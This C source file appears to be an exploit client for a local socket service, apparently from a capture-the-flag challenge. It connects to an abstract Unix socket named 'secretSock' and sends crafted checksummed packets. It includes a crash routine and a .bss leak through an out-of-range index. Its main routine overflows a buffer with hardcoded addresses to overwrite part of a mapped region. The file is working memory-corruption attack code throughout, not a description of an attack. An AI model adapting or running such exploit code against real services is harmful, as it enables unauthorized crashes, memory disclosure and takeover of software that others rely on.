#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <zlib.h>

int sockfd;

struct PackageContent {
    char action;
    char payload[255];
};

struct Package {
    long checksum;
    char header[5];
    struct PackageContent content;  
};

void initConnection() {
    char *socketName = "secretSock";
    struct sockaddr addr;

    // Create socket
    sockfd = socket(1, 1, 0);
    
    // Connect to socket
    memset(&addr, 0, sizeof(struct sockaddr));

    addr.sa_family = 1;
    strncpy(addr.sa_data+1, socketName, strlen(socketName));
    
    if (connect(sockfd, &addr, 0xd) == -1) {
        printf("Error on socket connect\n");
        exit(-1);       
    }   
}

void sendPackage(struct Package* pkg, struct PackageContent* answer, char action, char *payload, unsigned int len) {
    // Initialize package
    memset(pkg, 0, sizeof(struct Package));

    strcpy(pkg->header, "\x44\x41\x37\x37\x37");
    pkg->content.action = action;

    memcpy(pkg->content.payload, payload, len);

    // Create package checksum
    int res = adler32(0, 0, 0);
    pkg->checksum = adler32(res, (const char*)pkg, 0x10d);
    
    // Send to server
    write(sockfd, pkg, 0x10d);

    // Read server response
    memset(answer, 0, sizeof(struct PackageContent));
    read(sockfd, answer, 0x10d);
}

void setval(char *buffer, long offset, long value) {
    *(unsigned long*)(buffer+offset) = value;
}

void read_index(struct Package *pkg, struct PackageContent *answer, unsigned long idx) {
    char buffer[8] = {0};
    
    setval(buffer, 0, idx);
    sendPackage(pkg, answer, 3, buffer, 8);
}

void crash_service(struct Package *pkg, struct PackageContent *answer) {
    char buffer[256];
    memset(buffer, 0x41, 256);

    sendPackage(pkg, answer, 2, buffer, 256);
}

long get_from_offset(struct PackageContent *answer, long offset) {
    return *((long*)(answer->payload + offset));
}

void leak_bss(struct Package *pkg, struct PackageContent *answer) {
    read_index(pkg, answer, 0x603000/0x21);

    for(int i=0; i<200; i+=8) {
        printf("%p | ", (void*)get_from_offset(answer, i + 2));
    }
}

int main(int argc, char* argv[]) {
    struct Package pkg;
    struct PackageContent answer;

    initConnection();    

    // Initialize database
    sendPackage(&pkg, &answer, 4, NULL, 0);

    // Send package to overwrite LSB at mapped region
    char buffer[256] = {0};

    memset(buffer, 0x41, 32);

    setval(buffer, 32, 0xffffffffffbc66c0);
    setval(buffer, 40, 0x7ffff7ff3004);

    sendPackage(&pkg, &answer, 2, buffer, 256);

    // Request empty db check
    sendPackage(&pkg, &answer, 4, NULL, 0);

    puts((char*)answer.payload);
}